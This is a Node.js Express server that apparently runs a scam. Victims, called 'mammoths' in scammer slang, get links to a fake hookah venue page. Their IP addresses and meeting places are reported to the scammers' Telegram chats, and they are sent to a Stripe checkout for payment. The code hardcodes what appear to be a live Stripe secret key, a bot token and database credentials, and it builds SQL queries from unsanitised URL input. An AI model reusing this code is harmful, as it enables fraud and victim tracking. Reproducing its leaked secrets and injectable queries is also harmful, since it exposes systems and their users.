const {Client} = require('pg');
const TelegramApi = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const express = require('express');
const SECRET_KEY = "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";
const stripe = require('stripe')(SECRET_KEY);

// Подключение к бд
const client = new Client({
    host: "85.193.88.2",
    user: "gen_user",
    password: "syf790ux43",
    database: "default_db",
    port: 5432
})
client.connect()

// Обработака сайта
const app = express()
app.set('view engine', 'ejs')
app.use(express.urlencoded({extended: false}))
app.use(express.static('public'))

try {

    app.get('/', (req, res) => {
        res.render('error')
    })

    app.get('/:userlink', (req, res) => {
        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            if (ress.rows[0] === undefined) {
                return console.log("error")
            }
            if (ress) {
                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
                res.render('index', {userplace: ress.rows[0].place})
                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                    bot.sendMessage(res.rows[0].user_id, `💨 <b>Кальян\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'})
                })
                return console.log(ress.rows[0].place)
            } else {
                res.render(index, {userplace: "Москва Нирженская 15"})
            return console.log("undefined link") }
        })

    })
    

    app.post("/3ds", async (req, res) => {
        try {
            const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
            bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты кальян UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
            bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты кальян UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
            
            const session = await stripe.checkout.sessions.create({
            payment_method_types: ["card"],
            mode: "payment",
            line_items: [{
                price_data: {
                  currency: "uah",
                  product_data: {
                    name: `💨 FunnyHub Kalyan`,
                  },
                  unit_amount: req.body.amount * 100,
                },
                quantity: 1,
              }]
            ,
            success_url: `https://cinema-funnyhub.fun`,
            cancel_url: `https://cinema-funnyhub.fun`,
          })
          console.log(req.body)
          res.redirect(session.url)
        } catch (e) {
            res.status(500).json({ error: e.message })
        }
    })

} catch (err) {
    console.log('error');
  }

  const PORT = 8069

  app.listen(PORT, () => {
      console.log(`Server started... `)
  })
